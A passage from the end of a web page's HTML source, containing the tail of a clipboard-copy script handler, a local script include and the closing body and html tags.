            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js?v=3.js"></script>


    
</body>
</html>